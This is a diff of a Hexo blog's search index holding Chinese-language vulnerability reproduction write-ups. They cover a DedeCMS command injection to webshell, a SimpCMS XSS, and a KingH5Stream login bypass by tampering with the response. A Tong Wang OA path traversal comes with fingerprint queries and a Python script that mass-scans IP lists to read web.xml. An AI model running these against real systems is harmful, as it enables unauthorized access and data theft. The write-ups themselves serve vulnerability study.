@@ -1,179 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2024/11/14 CNVD漏洞跟踪复现报告</title>
-    <url>/2024/11/16/CNVD%20reoprt%201/</url>
-    <content><![CDATA[<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCvk6Hs9CQT9FOahNicDshCZjkjicdicedSTgANzu5mWHn4zp62Af0hSHibA/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h1
-id="北京亚控科技发展有限公司swagger-kingdbconnector存在信息泄露漏洞">北京亚控科技发展有限公司Swagger
-KingDBConnector存在信息泄露漏洞</h1>
-<h4 id="漏洞描述">漏洞描述</h4>
-<p>北京亚控科技发展有限公司是一家工业自动化和信息化软件平台高科技企业。</p>
-<p>北京亚控科技发展有限公司KingH5Stream系统存在信息泄露，攻击者可利用该漏洞获取录像及系统配置文件等敏感内容。</p>
-<p>攻击路径</p>
-<p>/mediastore/</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCx3MXXmAsesia8ywuOlYBBb8IUuUGgySb8sluUTbCQwF0KgzbaFrgYOQ/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>危害</p>
-<p>可看监控录像内容</p>
-<h1 id="dedecms命令注入漏洞">DedeCMS命令注入漏洞</h1>
-<h4 id="漏洞描述-1">漏洞描述</h4>
-<p>DedeCMS（织梦内容管理系统）是一套基于PHP的开源内容管理系统（CMS）。该系统具有内容发布、内容管理、内容编辑和内容检索等功能。</p>
-<p>DedeCMS存在命令注入漏洞，该漏洞源于article_string_mix.php文件未能正确过滤构造命令特殊字符、命令等。攻击者可利用该漏洞导致任意命令执行。</p>
-<p>攻击路径</p>
-<p>/dede/article_string_mix.php</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNClonUBOp91TfywAJFFKd7QXibhosc2mIQKO0r8I5OYnZRIMdrA8DDkvA/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCtzC5ZGmxgUniaJReY1KMFNOCmZd75NdtOQbibllibsRib3nCPqbU6XtCKg/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>找个一句话免杀马写里就行，过滤不严</p>
-<p>危害</p>
-<p>Getshell</p>
-<h1 id="simpcms跨站脚本漏洞">SimpCMS跨站脚本漏洞</h1>
-<h4 id="漏洞描述-2">漏洞描述</h4>
-<p>SimpCMS是一个基于PureEdit的易于使用的CMS。</p>
-<p>SimpCMS
-0.1版本存在跨站脚本漏洞，该漏洞源于应用对用户提供的数据缺乏有效过滤与转义，攻击者可利用该漏洞通过注入到/admin.php的标题字段的精心设计的有效负载执行任意Web脚本或HTML。</p>
-<p>攻击路径</p>
-<p>/admin/index.php</p>
-<p>进入后台</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCS5dq1whgcF3F0H9PjuI0DIGJRZibSXmAMW3AdopG0yD4Zic31rUyk5ag/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>直接打xss payload</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCiaLYtZ3cUDEfWAPvMLiaeXgNDrDCN5Q4x9OlQDMUJma2fUMshfmh3Fhg/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>危害</p>
-<p>钓鱼</p>
-<h1
-id="北京亚控科技发展有限公司kingh5stream存在逻辑缺陷漏洞">北京亚控科技发展有限公司KingH5Stream存在逻辑缺陷漏洞</h1>
-<p>(这个不是最新的，看到这个系统爆出来洞就去挖，挖够了10个资产结果告诉我是23年的CNVD
-emmmm)</p>
-<h4 id="漏洞描述-3">漏洞描述</h4>
-<p>北京亚控科技发展有限公司是一家自动化软件平台高科技企业。</p>
-<p>北京亚控科技发展有限公司KingH5Stream存在逻辑缺陷漏洞，攻击者可利用该漏洞获取用户密码，登录系统。</p>
-<p>进入登陆界面：</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsicic6El3D9AN82AXxGFj4MDJqCYrpthH3OmkEOQpc9icFSnj3OLBLEkog/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>用户名admin，密码随便填</p>
-<p>请求包：</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsvu6YiatUlZRGZEUvH5WdKURC7DFdMwAgBrfEibvk8XKG85gblbYQJ2dg/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>查看响应包：</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsjKNVe7KP8QGXJsqfCtgumiaIWueW5Vhw6Oduqj4SUIJ7O52UMJInUNQ/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>修改bStatus和strSession参数，将前者改为true，后者填个1，直接放包</p>
-<p>发现放包后系统请求了另一个包</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsWkRXyw2wDMQcd2gyiciaplokCqL42Nyl6VPVsQ9chZClqXZicNt8mowJg/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>那串hash值应该就是管理员密码hash值，解不解出来无所谓，放包之后直接进入系统</p>
-<figure>
-<img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsXyQcIV8CsuYcs9IXuiaVL5SNDJHdaYFuJibE0ibqlj53yu6qS6O5pf4qw/640?wx_fmt=png&amp;from=appmsg"
-                     
-alt="img" 
-                >
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Shi Bang IP Guangbo Unauthorized</title>
     <url>/2024/11/08/CNVD-2023-76197/</url>
     <content><![CDATA[
@@ -205,6 +32,32 @@ import {initHBE} from "/js/plugins/hbe.js";
     <content><![CDATA[
 <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
   <script id="hbeData" type="hbeData" data-hmacdigest="3474e85e5dc0d15b90873b22070a171e0cbf15fcb6d6f06a8fa21bb993ead31a">4b3ecdb6537e7115dee2acf67d9afff9009043d9ff2ae132b1ee3d617aaf8a1ddb5338a8ebd15cff35116550d93243bf13f5116ac6fca5f320bafc0fec905bf7f6d9421b270cbd357bf11670997496f47db331e6be8b830c08a7e50b62167297efdfe38b1fc23008264615e9686e72b294f873ec1d1ac9e264523d69ad982f5c8df6ae26ff42860fd730cc23b1366ca0bea5c2795c7c07e797fab8e185a65ce22c9e0726f689387ca2ce7b348e661dfce9a98ee9a566c1cfdaf8cc1785d28b4e66a89724c86d62fb7c3ee1dd4f82b7040aeb2c48e025049888497509a595c736b10b51619d450b76446f85deb11016f420010ec05f552ba463b8dff89704dfc5d19dd6b8765f430d750fe70edb971c103d0e476dba04c24c39257c2331cf46d69d6718d75b12a5101011e261f93f404586ec846a3fee3f7d04b6aadbac76cef0e46b6aeb301a97c269f75c507d7bb98e1421596a8e3a00c5132e5342fd3321216a09868b44205d7e8916423db8025522d10d486e8858f7e0a90ef368ce3127ce98165d37c22196c52cab789ab5a700ee1c4482f87d9f85600522a94d13918d1edf523d9b6fee3ef11b8535995815acc9cd3f2f83b59c044767518dec8d8af91b81542cc81d176f4dee691b56fe904f3915b563db7cebc34c689a3bff62495f961be6739d735f0c6e3b206136a7d78fa1aa21007da8ad9c1ef623178f4eeacf5ffd93422377af9031ad7f6ced2eaae4d34c169a1ac70040c0cd84f18a39b13ed7d50983d1d20e4968883fd89c88dbc242a34a4d5ff075427d2af25a77d3cd1713a4b7bba68b1b0617429f3c5158e1728aca1054805e7de22b65a27e97bbf8e4cbf825aa472792ab214ffad630bafec1fb2d12e4fcb82565d4a271982d111cea4d605832f0397fe9aae94e71c516b1a6fc5a56ef3c10ba2daf053a6f24d60931897cdc67c4bd62e1ed69d49e2d36492a4f496bf7f2a8fd5baf42b52f26f208f8ea24a6607a04d1a0dfe156fedbff6af5988d0407f4f6ed5ed81f4732b3e66f7fdee9d6bd42c71a364916d5cd89e8277a17ffc5587f490f321cfa01c5fda7f78ddff4cdf5dfb53050e7db29dd164c5577d2c7f26f7525fd48e8c26dc744907df0b8f560f20c6c68d28e1fba006bf9a5021e754fee4a2298fd4a90b4847ea185ae0e8ae5c480bb11447ed9cfb3945e8154ddc259ee6ff78f0c39b818494c92574c5ebcd1797dea28e9d7b8ebb1f2821876e14476a22fcf96ef637c00e7334dba9a8dda410044ad22d22263b22610565038322c0f036db09d40f2483f9c355dd4e957d8ded5c18f3d5ea39b9b0f8370c60eb75aa5770e3633c33c29d6d4a0c4b82711354274dc4d52854400d640a222bf6e1089fff0c0416e4a441a6fc496cc3c5d5167d3bdafb8fc69d8c5b87c6f213a0fd24e004e7a69305036fa41a55c990e3ca5c1613f64b440e33d9967cb0bb4f24980240f68ce6964ed3052cc3cc8c35bcde3e4482e833c433fb716afa1d34267949f210b6d727051c59f257cf25bfab944d6dbead22e6c35a162a04656239ceb5a3f5b619bd2a5c4b2893a20a5907745fbf12fbf4b429650180765ccfa0d0d94e709c2b6d979d6c29a2b0f0cb70136ac3e12b7b6d671aa7769f49a4ae2254869bc6342c8e1519b917571fb2a42b214ea3cb7441a7561356e5efe595a2cc014e18863ecdb00c18f7abd7d80b80da87f96be3c51b003061c29565e1daa4159ef045e7ff61c8bf72ebbe7cd64b854f60f8c95c7e7c17bc847ac0553f48976fa87852344650bf1345b9c51a5c9a1f5e3f035442853008d6807d7936136dd2b9c0c3ea6b9</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
+<script data-swup-reload-script type="module">
+import {initHBE} from "/js/plugins/hbe.js";
+  console.log("hexo-blog-encrypt: loaded.");
+    initHBE();
+</script>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wei Ning sql inject</title>
+    <url>/2024/11/08/CNVD-2024-13639/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="8df295a5dfd048774a2ab55be1a6d8c53a417eca1681ea076492812e8fb4056a">711009fc8ce7d12d708ecc49639eba1a854ee23c300c70549eb674c6b20dbb1c30a9bd0c883d1da0f9d0f7deb48e90a554a8d9be87a1cee9932f8579489c00b295e3f40d1ca3291a48b1b9d73e27152242d55d49f63d6d1d7b107d5f6fad0d68f40d99c7d0228ee05d28f505e89477e4ef1e91395b83925d4eae25fe4d6111b7dddbb5cd231dc01007217e2248abf7aeda99aa6649ec89d3b745ec912d2ed9f7e40f86c6a7b52dd1ce2f0464764f96ed46c713a6ce0d234138fad0531b387d8495d3622e02e9c9f4506f2ddbe65749e0959724825ff3255dff0b43b382991e03e7c420066ce534c48ef789cb0071ce4a757c7655cfcd4cf0ba11fe4bc0c0c244243f6266d5083d7117e125917d04dc03b123d4de8cb2013ee271691f68873022ac3fa387f49ae44c55ec43bcaa9f0234273e6623d662d8cd26b920e6adf259b56cf4e8ea64f839b1a3da6c28c562b0bd290e55251110a82fcac0d11b34d89cee0647b5a6e0da9e9a62b309351c65d7270135bd781c851c4a8ea66c9a84b8f94d19fd7e758af6c74b9fcb11f09eb8dc011a66d67a7fa589cf3b5426ca53730463c506f588f657019b65131418de5dc2d40bb011f98824f029a8beb6043c6e9e3db447171873db565dc39e428c8f80f3d7f2b2640334974993c2d97e2943ed134ea8ef1e50af8599cab94c1cc2cb5ee1d54db3b3a3de2b905294e1fe415ebaa0a3a315c3c7dba4c45ca2890c320a35241ee9f72945e098d469d1689a0cce76dc135d842fa0883fe10cb71969ec1043099043a966d7cfd68e40724edc1669ab7463a49ade847cb311f05d6f4fdb41d1ebbb9b24a41ad402e22c8dabfdaaf16e8b4a97a4b5d9bbfdc99c75a022b15ffb5f0e755efecfe0e76bf0be8899323b3669fe627f83db4abdc8a4e617a421248c9cec7b584f920eb43e633d51a957369ab9dd8576db45bb35e70806697b2547b00603c6a37cc546fb3a8672809ecffdfb38a9d67c2462484483e05aa81ec6c00db16bff8b5f85b5c56dc6160225cf20519173694b19155385b738546d1dd682d2140509be51722d54322832fe2b7cbb04578d986dfd2997f37b00a0475a6aaa0170eb816f040119300eca1ad47c9c2aa5490a688ef15136ed04a6576600e166f2ffc66f6a93a339b44fe5e4e98400dedb237a18925ee3088c9e5959f1bf7331773cbd82b2607375ef3e0568953ac15d939cf232020cd861b6b084d115b9b4bc5a25d5</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -278,32 +131,6 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>Wei Ning sql inject</title>
-    <url>/2024/11/08/CNVD-2024-13639/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="8df295a5dfd048774a2ab55be1a6d8c53a417eca1681ea076492812e8fb4056a">711009fc8ce7d12d708ecc49639eba1a854ee23c300c70549eb674c6b20dbb1c30a9bd0c883d1da0f9d0f7deb48e90a554a8d9be87a1cee9932f8579489c00b295e3f40d1ca3291a48b1b9d73e27152242d55d49f63d6d1d7b107d5f6fad0d68f40d99c7d0228ee05d28f505e89477e4ef1e91395b83925d4eae25fe4d6111b7dddbb5cd231dc01007217e2248abf7aeda99aa6649ec89d3b745ec912d2ed9f7e40f86c6a7b52dd1ce2f0464764f96ed46c713a6ce0d234138fad0531b387d8495d3622e02e9c9f4506f2ddbe65749e0959724825ff3255dff0b43b382991e03e7c420066ce534c48ef789cb0071ce4a757c7655cfcd4cf0ba11fe4bc0c0c244243f6266d5083d7117e125917d04dc03b123d4de8cb2013ee271691f68873022ac3fa387f49ae44c55ec43bcaa9f0234273e6623d662d8cd26b920e6adf259b56cf4e8ea64f839b1a3da6c28c562b0bd290e55251110a82fcac0d11b34d89cee0647b5a6e0da9e9a62b309351c65d7270135bd781c851c4a8ea66c9a84b8f94d19fd7e758af6c74b9fcb11f09eb8dc011a66d67a7fa589cf3b5426ca53730463c506f588f657019b65131418de5dc2d40bb011f98824f029a8beb6043c6e9e3db447171873db565dc39e428c8f80f3d7f2b2640334974993c2d97e2943ed134ea8ef1e50af8599cab94c1cc2cb5ee1d54db3b3a3de2b905294e1fe415ebaa0a3a315c3c7dba4c45ca2890c320a35241ee9f72945e098d469d1689a0cce76dc135d842fa0883fe10cb71969ec1043099043a966d7cfd68e40724edc1669ab7463a49ade847cb311f05d6f4fdb41d1ebbb9b24a41ad402e22c8dabfdaaf16e8b4a97a4b5d9bbfdc99c75a022b15ffb5f0e755efecfe0e76bf0be8899323b3669fe627f83db4abdc8a4e617a421248c9cec7b584f920eb43e633d51a957369ab9dd8576db45bb35e70806697b2547b00603c6a37cc546fb3a8672809ecffdfb38a9d67c2462484483e05aa81ec6c00db16bff8b5f85b5c56dc6160225cf20519173694b19155385b738546d1dd682d2140509be51722d54322832fe2b7cbb04578d986dfd2997f37b00a0475a6aaa0170eb816f040119300eca1ad47c9c2aa5490a688ef15136ed04a6576600e166f2ffc66f6a93a339b44fe5e4e98400dedb237a18925ee3088c9e5959f1bf7331773cbd82b2607375ef3e0568953ac15d939cf232020cd861b6b084d115b9b4bc5a25d5</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ezOffice Sql Inject</title>
     <url>/2024/11/08/DVB-2024-7947/</url>
     <content><![CDATA[
@@ -350,6 +177,51 @@ import {initHBE} from "/js/plugins/hbe.js";
   console.log("hexo-blog-encrypt: loaded.");
     initHBE();
 </script>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tong Wang OA tooneAssistantAttachement File read</title>
+    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
+    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
+<p>​
+同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
+<ul>
+<li>Fofa：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Hunter：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Quake：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用脚本">利用脚本</h4>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
 ]]></content>
       <tags>
         <tag>day</tag>
@@ -404,51 +276,6 @@ alt="image.png"
 <figcaption aria-hidden="true">image.png</figcaption>
 </figure>
 <p>那串hash值应该就是管理员密码hash值，解不解出来无所谓，放包之后直接进入系统</p>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tong Wang OA tooneAssistantAttachement File read</title>
-    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
-    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
-<p>​
-同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
-<ul>
-<li>Fofa：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Hunter：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Quake：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<h4 id="利用脚本">利用脚本</h4>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
 ]]></content>
       <tags>
         <tag>day</tag>
